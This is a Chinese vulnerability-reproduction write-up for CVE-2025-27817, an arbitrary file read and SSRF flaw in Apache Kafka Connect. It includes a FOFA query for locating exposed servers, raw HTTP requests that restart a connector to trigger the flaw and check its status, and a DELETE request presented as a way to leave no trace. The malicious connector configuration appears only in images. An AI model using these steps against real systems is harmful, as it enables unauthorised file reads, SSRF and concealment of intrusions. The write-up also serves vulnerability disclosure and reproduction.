## 1. Apache Kafka 简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

Apache Kafka 是一个分布式的流式数据平台，可以用于构建实时的数据管道和流式应用程序。

## 2.漏洞描述

2025年6月10日，Apache发布安全公告，修复了一个存在于 Apache Kafka Clients 中的任意文件读取与SSRF漏洞。漏洞编号：CVE-2025-27817，攻击者在可以控制Apache Kafka Connect 客户端的情况下，可通过SASL JAAS 配置和基于 SASL 的安全协议在其上创建或修改连接器相关配置，利用部分参数例如 sasl.oauthbearer.token.endpoint.url 和 sasl.oauthbearer.jwks.endpoint.url，造成任意文件读取与SSRF漏洞。Apache Kafka Connect 属于底层组件依赖，其前提利用条件需要视具体应用环境。如您在使用阿里云E-MapReduce集群，可根据EMR漏洞公告查看受漏洞影响的产品版本范围。如产品版本不受影响或已根据修复流程进行了漏洞修复，则可忽略当前漏洞。

CVE编号:CVE-2025-27817

CNNVD编号:

CNVD编号:

## 3.影响版本

3.1.0 <= Apache Kafka Client <= 3.9.0

![图片](Apache%20Kafka%20Connect%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9ECVE-2025-27817.assets/640.jpeg)

## 4.fofa查询语句

header="Jetty" && body="kafka_cluster_id"

## 5.漏洞复现

漏洞链接：http://xx.xx.xx.xx/connectors

![图片](Apache%20Kafka%20Connect%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9ECVE-2025-27817.assets/640-1750124567567-3.jpeg)

重启，使配置文件生效。

```
POST /connectors/319572437340/restart HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 1

 
```

![图片](Apache%20Kafka%20Connect%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9ECVE-2025-27817.assets/640-1750124567568-4.jpeg)

读取响应信息可通过以下接口查看连接器状态和错误信息，判断漏洞是否生效
http://xx.xx.xx.xx/connectors/319572437340/status

![图片](Apache%20Kafka%20Connect%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9ECVE-2025-27817.assets/640-1750124567568-5.jpeg)

删除节点，不留痕

```
DELETE /connectors/319572437340 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 0
```

